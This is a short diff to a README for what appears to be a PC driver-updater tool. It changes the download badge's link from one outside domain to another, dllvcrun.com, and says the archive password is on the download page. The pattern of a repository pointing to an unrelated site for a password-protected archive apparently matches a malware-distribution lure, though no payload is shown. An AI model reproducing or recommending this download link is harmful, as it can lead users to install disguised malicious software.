@@ -17,7 +17,7 @@ Scans your PC for outdated or missing drivers and downloads the latest official 
 
 ## Download
 
-[![⬇ Download v2.7.1](https://img.shields.io/badge/⬇_Download_v2.7.1-ec4899?style=for-the-badge&logoColor=white)](https://forumconnect.uk/drivers)
+[![⬇ Download v2.7.1](https://img.shields.io/badge/⬇_Download_v2.7.1-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/drivers)
 
 > The archive password is shown on the download page.
 
